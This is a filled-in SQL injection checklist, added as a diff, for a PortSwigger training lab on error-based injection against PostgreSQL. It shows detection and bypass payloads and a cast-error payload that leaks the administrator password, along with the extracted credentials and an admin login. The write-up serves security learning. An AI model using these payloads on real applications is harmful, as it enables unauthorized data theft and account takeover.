@@ -1,0 +1,84 @@
+==================================================
+SQL INJECTION - TEMPLATE
+==================================================
+
+Date       : January 07, 2026
+Lab/Target : PortSwigger - Visible Error-Based SQL Injection
+URL        : https://0a5c00a503da73d180c5492100eb0057.web-security-academy.net
+Objective  : Extract Administrator password via verbose error messages
+Comment    : PostgreSQL database. Input length limited to ~95 chars.
+
+==================================================
+PHASE 1 - DETECTION
+==================================================
+
+[x] Simple character test
+    ' -> Result: 500 Internal Server Error (Unterminated string literal...)
+
+[ ] Simple bypass test
+    ' OR '1'='1 -> Not needed (error is verbose enough)
+    ' OR 1=1--
+
+==================================================
+PHASE 2 - IDENTIFICATION
+==================================================
+
+2.1 DBMS type
+-------------
+[x] Get version / DBMS
+    The error message "Unterminated string literal..." and "invalid input syntax for type integer" confirms PostgreSQL.
+    Payload used: 'OR(SELECT password FROM users LIMIT 1)::int=1-- (uses Postgres ::int cast)
+
+2.2 Number of columns
+---------------------
+[ ] ORDER BY
+    (Not used - Error-Based vector doesn't require column counting)
+
+[ ] UNION NULL
+    (Not used)
+
+2.3 Displayed columns
+---------------------
+[ ] Visible columns test
+    (Not used - Data is extracted via Error Message)
+
+2.4 Current database
+--------------------
+[ ] Database name
+    (Implicitly confirmed via successful queries on current DB)
+
+==================================================
+PHASE 3 - EXPLOITATION (ERROR-BASED)
+==================================================
+
+3.1 List databases
+------------------
+    (Skipped - Direct target identified)
+
+3.2 List tables (target database)
+---------------------------------
+    Assumed 'users' table exists based on lab description.
+
+3.3 List columns (target table)
+-------------------------------
+    Assumed 'password' column exists based on lab description.
+
+3.4 Extract data
+----------------
+    [x] Extract password via Cast Error
+    Payload: 'OR(SELECT password FROM users LIMIT 1)::int=1--
+    Result: ERROR: invalid input syntax for type integer: "r1vx5nbuc7db48p6cfwx"
+
+==================================================
+PHASE 4 - BLIND SQLi (if UNION blocked)
+==================================================
+    (Not needed - Error-based was sufficient and faster)
+
+==================================================
+PHASE 5 - PRIVILEGE ESCALATION
+==================================================
+
+5.1 Login
+---------
+    [x] Logged in as administrator
+    Credentials: administrator / r1vx5nbuc7db48p6cfwx
